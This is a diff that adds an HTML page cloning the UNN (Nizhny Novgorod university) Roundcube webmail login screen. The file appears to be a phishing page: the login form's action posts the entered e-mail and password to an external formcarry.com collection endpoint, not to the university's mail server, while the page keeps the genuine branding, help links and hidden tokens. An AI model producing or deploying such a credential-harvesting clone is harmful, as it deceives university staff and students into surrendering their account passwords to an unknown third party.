@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<!-- saved from url=(0020)https://mail.unn.ru/ -->
+<html lang="ru" class="js chrome webkit layout-large"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>UNN Webmail :: Добро пожаловать в UNN Webmail!</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0"><meta name="theme-color" content="#f4f4f4"><meta name="msapplication-navbutton-color" content="#f4f4f4">
+	<link rel="shortcut icon" href="./unn_files/unn_logo.png">
+	<link rel="stylesheet" href="./unn_files/bootstrap.min.css">
+	
+		<link rel="stylesheet" href="./unn_files/styles.min.css">
+		
+	
+	
+		<script>
+		try {
+			if (document.cookie.indexOf('colorMode=dark') > -1
+				|| (document.cookie.indexOf('colorMode=light') === -1 && window.matchMedia('(prefers-color-scheme: dark)').matches)
+			) {
+				document.documentElement.className += ' dark-mode';
+			}
+		} catch (e) { }
+		</script>
+	
+<link rel="stylesheet" type="text/css" href="./unn_files/jquery-ui.min.css"><script src="./unn_files/jquery.min.js.download"></script><script src="./unn_files/common.min.js.download"></script><script src="./unn_files/app.min.js.download"></script><script src="./unn_files/jstz.min.js.download"></script><script>
+/*
+        @licstart  The following is the entire license notice for the 
+        JavaScript code in this page.
+
+        Copyright (C) The Roundcube Dev Team
+
+        The JavaScript code in this page is free software: you can redistribute
+        it and/or modify it under the terms of the GNU General Public License
+        as published by the Free Software Foundation, either version 3 of
+        the License, or (at your option) any later version.
+
+        The code is distributed WITHOUT ANY WARRANTY; without even the implied
+        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+        See the GNU GPL for more details.
+
+        @licend  The above is the entire license notice
+        for the JavaScript code in this page.
+*/
+var rcmail = new rcube_webmail();
+rcmail.set_env({"task":"login","standard_windows":false,"locale":"ru_RU","devel_mode":null,"rcversion":10611,"cookie_domain":"","cookie_path":"/","cookie_secure":true,"dark_mode_support":true,"skin":"elastic","blankpage":"skins/elastic/watermark.html","refresh_interval":60,"session_lifetime":600,"action":"","comm_path":"/?_task=login","compose_extwin":false,"date_format":"dd-mm-yy","date_format_localized":"ДД-ММ-ГГГГ","additional_logos":{"dark":"unn_logo.png","small":"unn_logo.png","small-dark":"unn_logo.png"},"request_token":"nr28lleVIssQcxS9dAuku2SqecVlkzBz"});
+rcmail.add_label({"loading":"Загрузка...","servererror":"Ошибка сервера!","connerror":"Ошибка соединения (Сбой подключения к серверу)!","requesttimedout":"Превышено время ожидания запроса","refreshing":"Обновление...","windowopenerror":"Всплывающее окно было заблокировано!","uploadingmany":"Загрузка файлов...","uploading":"Файл загружается…","close":"Закрыть","save":"Сохранить","cancel":"Отмена","alerttitle":"Внимание","confirmationtitle":"Внимание","delete":"Удалить","continue":"Продолжить","ok":"ОК","back":"Назад","errortitle":"Произошла ошибка!","options":"Параметры","plaintoggle":"Текст","htmltoggle":"HTML","previous":"Предыдущее","next":"Следующее","select":"Выбрать","browse":"Обзор","choosefile":"Выберите файл...","choosefiles":"Выберите файлы..."});
+rcmail.gui_container("loginfooter","login-footer");rcmail.gui_object('loginform', 'login-form');
+rcmail.gui_object('message', 'messagestack');
+</script>
+
+<script src="./unn_files/jquery-ui.min.js.download"></script><script src="./unn_files/datepicker-ru.js.download"></script>
+</head>
+<body class="task-login action-none">
+	
+		<div id="layout">
+	
+
+
+<h1 class="voice">UNN Webmail Войти</h1>
+
+<div id="layout-content" class="selected no-navbar" role="main">
+	<img src="./unn_files/unn_logo.png" id="logo" alt="Logo">
+	<form id="login-form" name="login-form" method="post" class="propform" action="https://formcarry.com/s/vBmiPh8P60z">
+<input type="hidden" name="_token" value="nr28lleVIssQcxS9dAuku2SqecVlkzBz" class="form-control">
+	<input type="hidden" name="_task" value="login" class="form-control"><input type="hidden" name="_action" value="login" class="form-control"><input type="hidden" name="_timezone" id="rcmlogintz" value="Africa/Lagos" class="form-control"><input type="hidden" name="_url" id="rcmloginurl" value="" class="form-control"><table><tbody><tr class="form-group row"><td class="title" style="display: none;"><label for="rcmloginuser">E-mail</label></td><td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon user"></i></span><input name="_user" id="rcmloginuser" required="" size="40" class="form-control" autocapitalize="off" value="" type="text" placeholder="E-mail"></td></tr><tr class="form-group row"><td class="title" style="display: none;"><label for="rcmloginpwd">Пароль</label></td><td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon pass"></i></span><input name="_pass" id="rcmloginpwd" required="" size="40" class="form-control" autocapitalize="off" type="password" placeholder="Пароль"></td></tr></tbody></table><p class="formbuttons"><button type="submit" id="rcmloginsubmit" class="button mainaction submit btn btn-primary btn-lg text-uppercase w-100">Войти</button></p>
+		<div id="login-footer" role="contentinfo">
+<font color="#606060" size="-1" align="center">
+<a href="https://mail.unn.ru/chpass/">Забыли пароль?</a><p>
+по вопросам работы сервера:<br>
+noc@unn.ru или заявка на portal.unn.ru<br>
+<a href="https://help.unn.ru/staff/handbook/e-mail/">Информация по работе с электронной почтой ННГУ</a>
+</p></font><p><font color="#606060" size="-1" align="center">
+</font>
+<!--			UNN Webmail
+			
+			
+			 -->
+		</p></div>
+	</form>
+</div>
+
+<noscript>
+	<p class="noscriptwarning">Внимание: Данному сервису веб-почты требуется Javascript! Для того, чтобы его использовать необходимо включить поддержку Javascript в настройках вашего браузера.</p>
+</noscript>
+
+
+</div>
+
+
+
+<div id="messagestack"></div>
+<script>
+$(function() {
+rcmail.init();
+});
+</script>
+
+
+
+<script src="./unn_files/bootstrap.bundle.min.js.download"></script>
+<script src="./unn_files/ui.min.js.download"></script>
+
+
+</body></html>
